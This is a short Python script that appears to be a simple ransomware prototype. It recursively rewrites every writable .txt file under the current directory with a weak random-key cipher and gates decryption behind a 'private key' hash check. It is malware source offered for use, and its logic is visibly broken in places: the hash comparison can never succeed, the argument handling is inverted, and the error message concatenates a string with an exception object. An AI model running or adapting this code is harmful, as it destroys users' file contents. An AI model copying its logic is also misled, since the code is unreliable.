#!/usr/bin/python
import tempfile, argparse
import os, sys, random, hashlib
from pathlib import *
from encrypt import encrypt_line, save_key
from decrypt import decrypt_line, find_key

def hash(text):
    result = hashlib.sha256(text.encode())

    # Only achieved if the correct private key entered
    if result == "":
        return True
    else:
        return False

def walk(input_path, key, action):
    p = Path(input_path)
    if (p.exists()):
        for file in p.rglob('*.txt'):
            if (os.access(file, os.W_OK) and os.access(file, os.R_OK)):
                try:
                    t = tempfile.NamedTemporaryFile(mode="r+")

                    with open(file, mode='r') as f:
                        for line in f:
                            if (action):
                                new_line = encrypt_line(line, key)
                            else:
                                new_line = decrypt_line(line, key)
                            t.write(new_line)

                    t.seek(0)

                    with open(file, mode='w') as f:
                        for line in t:
                            f.write(line)

                    t.close()

                    # saving the key in .key file
                    save_key(key)
                except IOError as e:
                    print(str(file) + ": raises exception\n" + e)

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Enter the private key:")
    parser.add_argument('-d', action="store_false", dest='decrypt', default=False)
    results = parser.parse_args()

    if (hash(results.decrypt)):
        key = find_key('.')
        walk('.', key, False)
    else:
        key = random.randint(1, 127)
        walk('.', key, True)





